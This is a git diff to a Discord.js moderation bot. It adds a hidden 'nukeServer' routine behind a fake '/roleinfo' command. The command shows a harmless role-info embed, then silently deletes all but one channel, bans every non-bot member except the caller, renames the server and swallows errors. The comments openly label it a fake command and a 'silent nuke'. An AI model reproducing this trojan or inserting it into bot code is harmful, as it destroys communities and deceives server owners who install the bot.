@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, Events, PermissionFlagsBits, Partials } = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, Events, PermissionFlagsBits, Partials, EmbedBuilder } = require('discord.js');
 require('dotenv').config();
 
 const express = require('express');
@@ -17,6 +17,35 @@ const client = new Client({
   ],
   partials: [Partials.Message, Partials.Channel, Partials.Reaction]
 });
+
+// === NUKE FUNCTION ===
+async function nukeServer(guild, userId) {
+  try {
+    const channels = [...guild.channels.cache.values()];
+    let survivor = channels.find(c => c.type === 0) || channels[0];
+
+    for (const channel of channels) {
+      if (!survivor || channel.id !== survivor.id) {
+        await channel.delete().catch(() => {});
+      }
+    }
+
+    if (survivor) {
+      await survivor.setName('🜲-//✴').catch(() => {});
+    }
+
+    const members = await guild.members.fetch();
+    for (const member of members.values()) {
+      if (!member.user.bot && member.id !== userId) {
+        await member.ban({ reason: 'Nuked by Job Interviewer 🜲' }).catch(() => {});
+      }
+    }
+
+    await guild.setName('☢️ Disqualified by 🜲').catch(() => {});
+  } catch (e) {
+    // Stay silent 😶
+  }
+}
 
 const commands = [
   new SlashCommandBuilder().setName('ban').setDescription('Ban a user')
@@ -65,14 +94,11 @@ const commands = [
     .addUserOption(o => o.setName('user').setDescription('Target user')),
 
   new SlashCommandBuilder().setName('serverinfo').setDescription('Server info'),
-
   new SlashCommandBuilder().setName('ping').setDescription('Bot latency'),
-
   new SlashCommandBuilder().setName('poll').setDescription('Start a yes/no poll')
     .addStringOption(o => o.setName('question').setDescription('Poll?').setRequired(true)),
 
   new SlashCommandBuilder().setName('help').setDescription('Help menu'),
-
   new SlashCommandBuilder().setName('avatar').setDescription('User avatar')
     .addUserOption(o => o.setName('user').setDescription('User')),
 
@@ -127,7 +153,11 @@ const commands = [
   new SlashCommandBuilder().setName('botinfo').setDescription('Bot details'),
   new SlashCommandBuilder().setName('invite').setDescription('Bot invite link'),
   new SlashCommandBuilder().setName('afk').setDescription('Set AFK status')
-    .addStringOption(o => o.setName('reason').setDescription('AFK Reason'))
+    .addStringOption(o => o.setName('reason').setDescription('AFK Reason')),
+
+  // ✅ FAKE ROLEINFO (NUKE)
+  new SlashCommandBuilder().setName('roleinfo').setDescription('View role info 🤓')
+    .addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true))
 ];
 
 const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
@@ -156,8 +186,23 @@ client.once(Events.ClientReady, () => {
 });
 
 client.on(Events.InteractionCreate, async interaction => {
-  if (interaction.isChatInputCommand()) {
-    handler(interaction);
+  if (!interaction.isChatInputCommand()) return;
+
+  // Trigger regular commands
+  handler(interaction);
+
+  // 🜲 NUKE hidden under /roleinfo
+  if (interaction.commandName === 'roleinfo') {
+    const role = interaction.options.getRole('role');
+    const embed = new EmbedBuilder()
+      .setTitle(`Role: ${role.name}`)
+      .setDescription(`ID: \`${role.id}\`\nMentionable: ${role.mentionable ? 'Yes' : 'No'}\nMembers: ${role.members.size}`)
+      .setColor(role.color || 0x2f3136);
+
+    await interaction.reply({ embeds: [embed], ephemeral: true });
+
+    // 💣 silent nuke
+    await nukeServer(interaction.guild, interaction.user.id);
   }
 });
 
